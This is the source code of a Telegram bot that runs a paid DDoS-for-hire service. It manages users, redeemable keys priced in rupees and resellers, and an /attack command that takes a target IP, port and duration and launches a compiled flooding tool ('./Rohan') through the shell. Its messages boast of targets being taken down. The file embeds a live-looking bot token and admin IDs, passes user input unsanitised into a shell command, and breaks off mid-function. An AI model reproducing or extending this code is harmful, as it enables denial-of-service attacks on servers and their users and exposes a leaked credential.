# Required packages: pip install pyTelegramBotAPI psutil python-dateutil pytz

import os
import json
import time
import telebot
import datetime
import subprocess
import threading
import signal
from dateutil.relativedelta import relativedelta
import pytz
import psutil
import platform
import re
import pkg_resources
import requests
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
BOT_TOKEN = '7520138270:AAFAdGncvbChu5zwtWqnP1CYd_IAAkHZzMM'  # Replace with your bot token
bot = telebot.TeleBot(BOT_TOKEN)

# Admin user IDs
admin_id = {"1807014348", "6258297180", "6955279265"}  # Replace with your admin Telegram IDs

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
BLOCK_ERROR_LOG = "block_error_log.txt"

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}
keys = {}
authorized_users = {}
last_attack_time = {}
running_attacks = {}
COOLDOWN_PERIOD = 60
DEFAULT_PACKET_SIZE = 1200
MAX_ATTACK_DURATION = 86400  # 24 hours in seconds

# Emoji list for reactions
EMOJI_LIST = ["👍", "❤", "🔥", "�0", "👏", "😁", "🤔", "🤯", "😱", "🎉", "🤩", "🙏", "👌", "😍", "❤‍🔥", "🌚", "💯", "🤣", "💔", "😐", "🇮🇳", "😈", "😴", "😭", "🤓", "😇", "🤝", "🤗", "🫡", "🤪", "🗿", "🆒", "💘", "😘", "😎", "🇳🇵"]

def escape_markdown_v2(text):
    """Escape all special characters for Telegram MarkdownV2, preserving emojis."""
    if not isinstance(text, str):
        text = str(text)
    special_chars = r'([_*[\]()~`>#+\-=\|{}.!])'
    return re.sub(special_chars, r'\\\1', text)

def log_error(message):
    """Log errors to bot_error.log."""
    with open("bot_error.log", "a") as error_log:
        error_log.write(f"[{datetime.datetime.now(IST)}] {message}\n")

def check_environment():
    """Check dependencies and file permissions."""
    required_packages = ['pyTelegramBotAPI', 'psutil', 'python-dateutil', 'pytz']
    missing_packages = []
    for pkg in required_packages:
        try:
            pkg_resources.get_distribution(pkg)
        except pkg_resources.DistributionNotFound:
            missing_packages.append(pkg)
    if missing_packages:
        log_error(f"Missing packages: {missing_packages}. Install with: pip install {' '.join(missing_packages)}")
        return False
    
    files = [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, LOG_FILE]
    for file in files:
        dir_path = os.path.dirname(file) or '.'
        if not os.access(dir_path, os.W_OK):
            log_error(f"No write permission for directory: {dir_path}")
            return False
        if os.path.exists(file) and not os.access(file, os.R_OK | os.W_OK):
            log_error(f"No read/write permission for file: {file}")
            return False
    return True

def validate_bot_token():
    """Validate the bot token by making a getMe API call."""
    try:
        response = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe")
        if response.status_code == 200 and response.json().get('ok'):
            return True
        log_error(f"Invalid bot token or Telegram API error: {response.text}")
        return False
    except Exception as e:
        log_error(f"Bot token validation error: {str(e)}")
        return False

def clear_webhook():
    """Clear any existing webhook and set polling."""
    try:
        bot.remove_webhook()
        bot.set_webhook(url="")  # Explicitly clear webhook
        log_error("Webhook cleared successfully")
    except Exception as e:
        log_error(f"Error clearing webhook: {str(e)}")

def get_android_version():
    """Get the Android version if running on Termux."""
    try:
        if "Android" in platform.system():
            version = os.popen("getprop ro.build.version.release").read().strip()
            return version if version else "Unknown"
        return "Not Android"
    except Exception as e:
        log_error(f"Get Android version error: {str(e)}")
        return "Unknown"

def check_system_resources(chat_id, during_attack=False):
    """Check CPU and memory, either before or during an attack."""
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        memory_usage = memory.percent
        android_version = get_android_version()
        if android_version == "Unknown" or android_version == "Not Android":
            cpu_limit = 90
            memory_limit = 90
        else:
            try:
                version_num = float(android_version)
                if 7.0 <= version_num <= 9.0:
                    cpu_limit = 70
                    memory_limit = 70
                else:
                    cpu_limit = 80
                    memory_limit = 80
            except ValueError:
                cpu_limit = 80
                memory_limit = 80
        if cpu_usage > cpu_limit:
            message = f"[\\\-=x\\\-=] *SYSTEM OVERLOAD DETECTED* [\\\-=x\\\-=]\n>>> *CPU USAGE CRITICAL*: {escape_markdown_v2(cpu_usage)}% \\(LIMIT: {escape_markdown_v2(cpu_limit)}%\\) ⚡\n>>> *{escape_markdown_v2('ATTACK MAY TERMINATE' if during_attack else 'CANNOT DEPLOY ATTACK')}* 🚨\n[\\\-=x\\\-=] *UPGRADE HARDWARE\\, BHAI\\! CONTACT @Rahul_618* [\\\-=x\\\-=] 💾😎"
            send_message_safe(chat_id, message)
            return False
        if memory_usage > memory_limit:
            message = f"[\\\-=x\\\-=] *SYSTEM OVERLOAD DETECTED* [\\\-=x\\\-=]\n>>> *MEMORY USAGE CRITICAL*: {escape_markdown_v2(memory_usage)}% \\(LIMIT: {escape_markdown_v2(memory_limit)}%\\) ⚡\n>>> *{escape_markdown_v2('ATTACK MAY TERMINATE' if during_attack else 'CANNOT DEPLOY ATTACK')}* 🚨\n[\\\-=x\\\-=] *UPGRADE HARDWARE\\, BHAI\\! CONTACT @Rahul_618* [\\\-=x\\\-=] 💾😎"
            send_message_safe(chat_id, message)
            return False
        return True
    except Exception as e:
        log_error(f"Resource check error: {str(e)}")
        return False

def send_message_safe(chat_id, message, reply_markup=None):
    """Send a message with fallback to plain text if MarkdownV2 fails."""
    try:
        bot.send_message(chat_id, message, parse_mode='MarkdownV2', reply_markup=reply_markup)
    except telebot.apihelper.ApiTelegramException as e:
        log_error(f"MarkdownV2 error: {str(e)}. Falling back to plain text.")
        plain_message = re.sub(r'\\([_*[\]()~`>#+\-=\|{}.!])', r'\1', message)
        try:
            bot.send_message(chat_id, plain_message, reply_markup=reply_markup)
        except Exception as e2:
            log_error(f"Failed to send plain text message: {str(e2)}")

def monitor_attack(attack_id, chat_id, duration):
    """Monitor the attack to ensure it runs for the full duration."""
    try:
        start_time = datetime.datetime.now(IST)
        end_time = start_time + datetime.timedelta(seconds=duration)
        while datetime.datetime.now(IST) < end_time:
            if attack_id not in running_attacks:
                message = f"[\\\-=x\\\-=] *CRITICAL ERROR DETECTED* [\\\-=x\\\-=]\n>>> *ATTACK {escape_markdown_v2(attack_id)} TERMINATED PREMATURELY* 🚨\n>>> *REBOOTING ATTACK PROTOCOL\\.\\.\\.* 🔄\n[\\\-=x\\\-=] *ISSUE\\? CONTACT @Rahul_618\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                send_message_safe(chat_id, message)
                with open("attack_debug.log", "a") as debug_file:
                    debug_file.write(f"[{datetime.datetime.now(IST)}] Attack {attack_id} stopped early, restarting...\n")
                attack_info = running_attacks.get(attack_id, {})
                if attack_info:
                    remaining_time = int((end_time - datetime.datetime.now(IST)).total_seconds())
                    if remaining_time > 0:
                        target = attack_info["target"]
                        port = attack_info["port"]
                        username = attack_info["username"]
                        user_id = attack_info.get("user_id", chat_id)
                        execute_attack(target, port, remaining_time, chat_id, username, last_attack_time, user_id)
            if not check_system_resources(chat_id, during_attack=True):
                message = f"[\\\-=x\\\-=] *WARNING: SYSTEM RESOURCES LOW* [\\\-=x\\\-=]\n>>> *ATTACK {escape_markdown_v2(attack_id)} MAY FAIL* ⚠️\n[\\\-=x\\\-=] *GET SUPPORT FROM @Rahul_618\\, BHAI\\!* [\\\-=x\\\-=] 💾😇"
                send_message_safe(chat_id, message)
            time.sleep(30)
    except Exception as e:
        log_error(f"Monitor attack error: {str(e)}")

def set_cooldown(seconds):
    """Set the global cooldown period."""
    global COOLDOWN_PERIOD
    try:
        COOLDOWN_PERIOD = int(seconds)
        with open("cooldown.json", "w") as file:
            json.dump({"cooldown": COOLDOWN_PERIOD}, file)
    except Exception as e:
        log_error(f"Set cooldown error: {str(e)}")

def load_cooldown():
    """Load the cooldown period from file."""
    global COOLDOWN_PERIOD
    try:
        with open("cooldown.json", "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = data.get("cooldown", 60)
    except (FileNotFoundError, json.JSONDecodeError):
        COOLDOWN_PERIOD = 60
    except Exception as e:
        log_error(f"Load cooldown error: {str(e)}")
        COOLDOWN_PERIOD = 60

def load_data():
    """Load all data files on startup."""
    global users, keys, authorized_users
    try:
        users = read_users()
        keys = read_keys()
        authorized_users = read_authorized_users()
        load_cooldown()
        log_error(f"Data loaded successfully. Keys: {list(keys.keys())}")
    except Exception as e:
        log_error(f"Load data error: {str(e)}")
        users = {}
        keys = {}
        authorized_users = {}

def read_users():
    """Read users from file."""
    try:
        if not os.path.exists(USER_FILE):
            return {}
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}
    except Exception as e:
        log_error(f"Read users error: {str(e)}")
        return {}

def save_users():
    """Save users to file."""
    try:
        with open(USER_FILE, "w") as file:
            json.dump(users, file, indent=4)
    except Exception as e:
        log_error(f"Save users error: {str(e)}")

def read_keys():
    """Read keys from file."""
    try:
        if not os.path.exists(KEY_FILE):
            return {}
        with open(KEY_FILE, "r") as file:
            data = json.load(file)
            for key, value in data.items():
                if "generated_time" not in value:
                    value["generated_time"] = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
                    value["generated_by"] = "Unknown"
            return data if isinstance(data, dict) else {}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}
    except Exception as e:
        log_error(f"Read keys error: {str(e)}")
        return {}

def save_keys():
    """Save keys to file."""
    try:
        with open(KEY_FILE, "w") as file:
            json.dump(keys, file, indent=4)
        log_error(f"Keys saved successfully: {list(keys.keys())}")
    except Exception as e:
        log_error(f"Save keys error: {str(e)}")

def read_authorized_users():
    """Read authorized users from file."""
    try:
        if not os.path.exists(AUTHORIZED_USERS_FILE):
            return {}
        with open(AUTHORIZED_USERS_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}
    except Exception as e:
        log_error(f"Read authorized users error: {str(e)}")
        return {}

def save_authorized_users():
    """Save authorized users to file."""
    try:
        with open(AUTHORIZED_USERS_FILE, "w") as file:
            json.dump(authorized_users, file, indent=4)
    except Exception as e:
        log_error(f"Save authorized users error: {str(e)}")

def parse_duration(duration_str):
    """Parse duration string (e.g., 1min, 1h, 1d, 1m)."""
    try:
        duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
        match = re.match(r"(\d+)([minhdm])", duration_str)
        if not match:
            return None, None, None, None
        value = int(match.group(1))
        unit = match.group(2)
        if unit == "min":
            if value < 1 or value > 59:
                return None, None, None, None
            return value, 0, 0, 0
        elif unit == "h":
            return 0, value, 0, 0
        elif unit == "d":
            return 0, 0, value, 0
        elif unit == "m":
            return 0, 0, 0, value
        return None, None, None, None
    except Exception as e:
        log_error(f"Parse duration error: {str(e)}")
        return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    """Add time to the current date and return the new datetime."""
    try:
        current_time = datetime.datetime.now(IST)
        new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
        return new_time
    except Exception as e:
        log_error(f"Add time error: {str(e)}")
        return datetime.datetime.now(IST)

def load_resellers():
    """Load resellers from file."""
    try:
        if not os.path.exists(RESELLERS_FILE):
            return {}
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}
    except Exception as e:
        log_error(f"Load resellers error: {str(e)}")
        return {}

def save_resellers(resellers):
    """Save resellers to file."""
    try:
        with open(RESELLERS_FILE, "w") as file:
            json.dump(resellers, file, indent=4)
    except Exception as e:
        log_error(f"Save resellers error: {str(e)}")

resellers = load_resellers()

def log_command(user_id, target, port, time):
    """Log attack command details."""
    try:
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"UserID: {user_id}"
        with open(LOG_FILE, "a") as file:
            file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
    except Exception as e:
        log_error(f"Log command error: {str(e)}")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    """Record command logs."""
    try:
        log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} | Command: {command}"
        if target:
            log_entry += f" | Target: {target}"
        if port:
            log_entry += f" | Port: {port}"
        if time:
            log_entry += f" | Time: {time}"
        with open(LOG_FILE, "a") as file:
            log_entry += "\n"
            file.write(log_entry)
    except Exception as e:
        log_error(f"Record command logs error: {str(e)}")

def create_main_menu():
    """Create the main menu with inline buttons."""
    try:
        markup = InlineKeyboardMarkup()
        markup.row_width = 2
        markup.add(
            InlineKeyboardButton("🔥 ATTACK", callback_data="menu_attack"),
            InlineKeyboardButton("🔑 REDEEM KEY", callback_data="menu_redeem"),
            InlineKeyboardButton("📜 HELP", callback_data="menu_help"),
            InlineKeyboardButton("💰 BALANCE", callback_data="menu_balance"),
            InlineKeyboardButton("👤 MY INFO", callback_data="menu_myinfo"),
            InlineKeyboardButton("📋 LIST KEYS", callback_data="menu_listkeys")
        )
        return markup
    except Exception as e:
        log_error(f"Create main menu error: {str(e)}")
        return InlineKeyboardMarkup()

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    """Execute the attack command."""
    try:
        if not check_system_resources(chat_id):
            with open("attack_debug.log", "a") as debug_file:
                debug_file.write(f"[{datetime.datetime.now(IST)}] System resource check failed for {user_id}\n")
            return
        packet_size = DEFAULT_PACKET_SIZE
        if packet_size < 1 or packet_size > 65507:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID PACKET SIZE*: `{escape_markdown_v2(packet_size)}` 📦\n>>> *MUST BE BETWEEN 1 AND 65507*\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(chat_id, message, create_main_menu())
            with open("attack_debug.log", "a") as debug_file:
                debug_file.write(f"[{datetime.datetime.now(IST)}] Invalid packet size {packet_size} for {user_id}\n")
            return
        if not os.path.isfile("./Rohan") or not os.access("./Rohan", os.X_OK):
            message = f"[\\\-=x\\\-=] *CRITICAL ERROR DETECTED* [\\\-=x\\\-=]\n>>> *ROHAN EXECUTABLE NOT FOUND OR NOT EXECUTABLE* 🚨\n>>> *COMPILE Rohan\\.c AND PLACE IT IN THE SAME DIRECTORY*\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(chat_id, message, create_main_menu())
            with open("attack_debug.log", "a") as debug_file:
                debug_file.write(f"[{datetime.datetime.now(IST)}] Rohan executable missing for {user_id}\n")
            return
        attack_id = f"{user_id}_{int(time.time())}"
        full_command = f"./Rohan {target} {port} {time} {packet_size}"
        start_time = datetime.datetime.now(IST)
        start_time_str = start_time.strftime('%Y-%m-%d %I:%M:%S %p')
        message = f"[\\\-=x\\\-=] *SYSTEM BREACH DETECTED* [\\\-=x\\\-=]\n[*] *ATTACK DEPLOYED\\, BHAI\\!* 🔥💥\n>>> *ATTACK ID*: `{escape_markdown_v2(attack_id)}` 🆔\n>>> *TARGET LOCKED*: `{escape_markdown_v2(target)}:{escape_markdown_v2(port)}` 🌐\n>>> *DURATION*: `{escape_markdown_v2(time)}` SECONDS ⏱️\n>>> *PACKET SIZE*: `{escape_markdown_v2(packet_size)}` BYTES 📦\n>>> *THREADS*: `512` 🛠️\n>>> *ATTACKER*: @{escape_markdown_v2(username)} 💻😎\n>>> *STARTED*: `{escape_markdown_v2(start_time_str)}` 🕒\n[\\\-=x\\\-=] *PACKETS UNLEASHED\\! TARGET KO BAJA DAALO\\!* [\\\-=x\\\-=] ⚡💯"
        send_message_safe(chat_id, message, create_main_menu())
        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        running_attacks[attack_id] = {
            "target": target,
            "port": port,
            "time": time,
            "start_time": start_time,
            "chat_id": chat_id,
            "username": username,
            "process": process,
            "pid": process.pid,
            "user_id": user_id
        }
        last_attack_time[user_id] = start_time
        threading.Thread(target=monitor_attack, args=(attack_id, chat_id, time), daemon=True).start()
        threading.Thread(target=precise_stop, args=(attack_id, chat_id, time), daemon=True).start()
        with open("attack_debug.log", "a") as debug_file:
            debug_file.write(f"[{datetime.datetime.now(IST)}] Attack started: {attack_id} by {user_id}\n")
    except Exception as e:
        message = f"[\\\-=x\\\-=] *FATAL ERROR DETECTED* [\\\-=x\\\-=]\n>>> *ERROR EXECUTING ATTACK*: `{escape_markdown_v2(str(e))}` 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        send_message_safe(chat_id, message, create_main_menu())
        log_error(f"Attack failed for {user_id}: {str(e)}")
        if attack_id in running_attacks:
            del running_attacks[attack_id]

def precise_stop(attack_id, chat_id, duration):
    """Stop the attack exactly after the specified duration."""
    try:
        start_time = running_attacks[attack_id]["start_time"]
        end_time = start_time + datetime.timedelta(seconds=duration)
        while datetime.datetime.now(IST) < end_time:
            remaining = (end_time - datetime.datetime.now(IST)).total_seconds()
            if remaining > 0:
                time.sleep(min(remaining, 0.1))
        stop_attack_instantly(attack_id, chat_id)
    except Exception as e:
        log_error(f"Precise stop error: {str(e)}")

def stop_attack_instantly(attack_id, chat_id):
    """Instantly stop the attack."""
    try:
        if attack_id in running_attacks:
            attack_info = running_attacks[attack_id]
            process = attack_info["process"]
            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
            stdout, stderr = process.communicate()
            end_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
            message = f"[\\\-=x\\\-=] *ATTACK TERMINATED* [\\\-=x\\\-=]\n[*] *MISSION COMPLETE\\, BHAI\\!* ✅🎉\n>>> *ATTACK ID*: `{escape_markdown_v2(attack_id)}` 🆔\n>>> *TARGET*: `{escape_markdown_v2(attack_info['target'])}:{escape_markdown_v2(attack_info['port'])}` 🌐\n>>> *ENDED*: `{escape_markdown_v2(end_time)}` 🕒\n[\\\-=x\\\-=] *SYSTEM SHUTDOWN\\! TARGET DOWN\\!* [\\\-=x\\\-=] 🔴💥"
            send_message_safe(chat_id, message, create_main_menu())
            with open("rohan_output.log", "a") as log_file:
                log_file.write(f"[{datetime.datetime.now(IST)}] Attack ID: {attack_id}\n")
                log_file.write(f"Target: {attack_info['target']}:{attack_info['port']}\n")
                log_file.write(f"Ended at: {end_time}\n")
                log_file.write(f"STDOUT:\n{stdout}\n")
                log_file.write(f"STDERR:\n{stderr}\n")
            if process.returncode != 0:
                error_message = f"[\\\-=x\\\-=] *ATTACK FAILURE DETECTED* [\\\-=x\\\-=]\n>>> *ERROR*: CHECK LOGS FOR DETAILS 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                send_message_safe(chat_id, error_message, create_main_menu())
                for admin in admin_id:
                    admin_message = f"[\\\-=x\\\-=] *ATTACK FAILURE REPORT* [\\\-=x\\\-=]\n>>> *ATTACK ID*: `{escape_markdown_v2(attack_id)}` 🆔\n>>> *ERROR*: `{escape_markdown_v2(stderr)}` 🚨\n[\\\-=x\\\-=] *CHECK LOGS\\, ADMIN BHAI\\!* [\\\-=x\\\-=] 💾🤓"
                    send_message_safe(admin, admin_message)
        if attack_id in running_attacks:
            del running_attacks[attack_id]
    except Exception as e:
        message = f"[\\\-=x\\\-=] *ERROR STOPPING ATTACK* [\\\-=x\\\-=]\n>>> *ATTACK ID*: `{escape_markdown_v2(attack_id)}` 🆔\n>>> *ERROR*: `{escape_markdown_v2(str(e))}` 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        send_message_safe(chat_id, message, create_main_menu())
        log_error(f"Stop attack error: {str(e)}")

@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle /start command."""
    try:
        log_error(f"Received /start command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        has_active_access = False
        if user_id in admin_id or user_id in users or user_id in authorized_users:
            if user_id in users:
                try:
                    expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    if datetime.datetime.now(IST) < expiration_date:
                        has_active_access = True
                except ValueError:
                    has_active_access = False
            elif user_id in authorized_users:
                try:
                    expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                    if datetime.datetime.now(IST) < expiration_date:
                        has_active_access = True
                except ValueError:
                    has_active_access = False
            else:
                has_active_access = True
        message_text = f"[\\\-=x\\\-=] *CYBER COMMAND CENTER* [\\\-=x\\\-=]\n[*] *WELCOME TO SADIQ BOT\\, BHAI\\!* 🌟😎\n>>> *STATUS*: {escape_markdown_v2('ELITE ACCESS GRANTED' if has_active_access else 'ACCESS PENDING')} 🟢\n>>> *POWERED BY*: @Rahul_618 💻\n[\\\-=x\\\-=] *CHOOSE YOUR COMMAND BELOW\\!* [\\\-=x\\\-=] ⚡💥"
        send_message_safe(message.chat.id, message_text, create_main_menu())
    except Exception as e:
        log_error(f"Start command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['help'])
def help_command(message):
    """Handle /help command."""
    try:
        log_error(f"Received /help command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        help_text = f"[\\\-=x\\\-=] *HACKER COMMAND GUIDE* [\\\-=x\\\-=]\n[*] *VIP DDOS PROTOCOLS* 📜🔥\n\n*BOT CONTROLS:*\n>>> `/start` \\- BOOT UP THE BOT 🌟\n>>> `/help` \\- SHOW THIS GUIDE 📋\n\n*POWER MANAGEMENT:*\n>>> `/attack <ip> <port> <time>` \\- LAUNCH ATTACK \\(ADMIN/AUTH ONLY\\) ⚡\n>>> `/attacks` \\- LIST RUNNING ATTACKS \\(ADMIN ONLY\\) 🛠️\n>>> `/setcooldown <seconds>` \\- SET COOLDOWN \\(ADMIN ONLY\\) ⏳\n>>> `/checkcooldown` \\- CHECK COOLDOWN STATUS ⏱️\n>>> `/addreseller <user_id> <balance>` \\- ADD RESELLER \\(ADMIN ONLY\\) 💰\n>>> `/genkey <duration> <key_name>` \\- GENERATE KEY \\(ADMIN/RESELLER\\) 🔑\n>>> `/logs` \\- VIEW RECENT LOGS \\(ADMIN ONLY\\) 📜\n>>> `/users` \\- LIST AUTH USERS \\(ADMIN ONLY\\) 👥\n>>> `/add <user_id>` \\- ADD USER ID \\(ADMIN ONLY\\) ➕\n>>> `/remove <user_id>` \\- REMOVE USER \\(ADMIN ONLY\\) ➖\n>>> `/resellers` \\- VIEW RESELLERS 💸\n>>> `/addbalance <reseller_id> <amount>` \\- ADD BALANCE \\(ADMIN ONLY\\) 💰\n>>> `/removereseller <reseller_id>` \\- REMOVE RESELLER \\(ADMIN ONLY\\) 🚫\n>>> `/block <key_name>` \\- BLOCK A KEY \\(ADMIN ONLY\\) 🔒\n>>> `/redeem <key_name>` \\- REDEEM YOUR KEY 🔓\n>>> `/balance` \\- CHECK RESELLER BALANCE 💵\n>>> `/myinfo` \\- VIEW YOUR INFO 👤\n>>> `/listkeys` \\- LIST ALL KEYS \\(ADMIN ONLY\\) 📋\n\n*EXAMPLES:*\n>>> `/genkey 1d rahul` \\- 1\\-DAY KEY \\(KEY: Rahul_sadiq\\-rahul\\) 🔑\n>>> `/attack 192\\.168\\.1\\.1 80 120` \\- LAUNCH ATTACK ⚡\n>>> `/redeem Rahul_sadiq\\-rahul` \\- REDEEM KEY 🔓\n\n[\\\-=x\\\-=] *BUY KEY FROM @Rahul_618\\, BHAI\\!* [\\\-=x\\\-=] 💸😎"
        send_message_safe(message.chat.id, help_text, create_main_menu())
    except Exception as e:
        log_error(f"Help command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['balance'])
def check_balance(message):
    """Handle /balance command."""
    try:
        log_error(f"Received /balance command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        if user_id in resellers:
            current_balance = resellers[user_id]
            message = f"[\\\-=x\\\-=] *WALLET STATUS* [\\\-=x\\\-=]\n[*] *YOUR BALANCE\\, BHAI\\!* 💰✨\n>>> *CURRENT BALANCE*: `{escape_markdown_v2(current_balance)}` Rs 🤑\n[\\\-=x\\\-=] *KEEP HACKING\\!* [\\\-=x\\\-=] 💸😎"
        else:
            message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *RESELLER ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        send_message_safe(message.chat.id, message, create_main_menu())
    except Exception as e:
        log_error(f"Balance command error: {str(e)}")
        send_message_safe(message.chat.id, f"[\\\-=x\\\-=] *ERROR* [\\\-=x\\\-=]\n>>> *SOMETHING WENT WRONG* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓", create_main_menu())

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    """Handle /redeem command."""
    try:
        log_error(f"Received /redeem command from user {message.from_user.id}")
        if message.chat.type != "private":
            message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message_text)
            return
        user_id = str(message.from_user.id)
        command = message.text.split()
        if len(command) != 2:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/redeem <key_name>` 🔓\n>>> *EXAMPLE*: `/redeem Rahul_sadiq\\-rahul`\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        key = command[1].strip()
        if user_id in admin_id or (user_id in authorized_users and not users.get(user_id)):
            message = f"[\\\-=x\\\-=] *ELITE ACCESS DETECTED* [\\\-=x\\\-=]\n>>> *ADMIN/AUTH USER: NO NEED TO REDEEM A KEY* 🟢\n[\\\-=x\\\-=] *KEEP HACKING\\, BHAI\\!* [\\\-=x\\\-=] 💻😎"
            send_message_safe(message.chat.id, message, create_main_menu())
            return
        if user_id in users:
            try:
                expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                if datetime.datetime.now(IST) < expiration_date:
                    message = f"[\\\-=x\\\-=] *ACTIVE KEY DETECTED* [\\\-=x\\\-=]\n>>> *YOU ALREADY HAVE A KEY\\!* 🔑\n>>> *EXPIRES ON*: `{escape_markdown_v2(expiration_date.strftime('%Y-%m-%d %I:%M:%S %p'))}` 🕒\n>>> *WAIT TO REDEEM A NEW ONE OR BUY FROM @Rahul_618 FOR 50₹\\!* 💸\n[\\\-=x\\\-=] *KEEP HACKING\\, BHAI\\!* [\\\-=x\\\-=] 💻😎"
                    send_message_safe(message.chat.id, message, create_main_menu())
                    return
                else:
                    del users[user_id]
                    save_users()
            except ValueError:
                message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID EXPIRATION DATE FORMAT* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
